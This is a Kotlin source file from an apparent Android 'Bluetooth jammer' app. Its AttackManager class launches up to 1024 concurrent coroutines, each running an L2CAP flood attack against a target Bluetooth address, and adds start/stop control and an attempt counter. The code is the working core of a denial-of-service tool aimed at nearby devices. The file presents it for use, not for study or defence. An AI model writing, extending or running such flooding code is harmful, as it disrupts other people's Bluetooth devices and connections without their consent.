package com.eikarna.bluetoothjammer.api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancelChildren
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * NEW — owns all attack coroutines + sockets so Start/Stop actually works.
 * The original started N orphan coroutines with no handle; Stop built a fresh
 * instance and cancelled its empty scope, so threads lived until force-close.
 */
class AttackManager {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val jobs = mutableListOf<Job>()
    private val running = AtomicBoolean(false)
    val attemptCount = AtomicInteger(0)

    val isRunning: Boolean get() = running.get()

    @SuppressLint("MissingPermission")
    fun start(
        context: Context,
        address: String,
        threads: Int,
        onLog: (String) -> Unit
    ) {
        stop() // clean slate
        val appCtx = context.applicationContext
        val mgr = appCtx.getSystemService(BluetoothManager::class.java)
        val adapter: BluetoothAdapter? = mgr?.adapter
        if (adapter == null) {
            onLog("Bluetooth adapter not available.")
            return
        }
        try { adapter.cancelDiscovery() } catch (ignored: Exception) {}

        running.set(true)
        attemptCount.set(0)
        val n = threads.coerceIn(1, 1024)
        repeat(n) {
            val job = scope.launch {
                L2capFloodAttack(address).execute(
                    context = appCtx,
                    adapter = adapter,
                    onLog = {
                        attemptCount.incrementAndGet()
                        onLog(it)
                    },
                    isRunning = { running.get() }
                )
            }
            synchronized(jobs) { jobs.add(job) }
        }
    }

    fun stop() {
        running.set(false)
        synchronized(jobs) {
            jobs.forEach { try { it.cancel() } catch (ignored: Exception) {} }
            jobs.clear()
        }
        try { scope.coroutineContext.cancelChildren() } catch (ignored: Exception) {}
    }
}
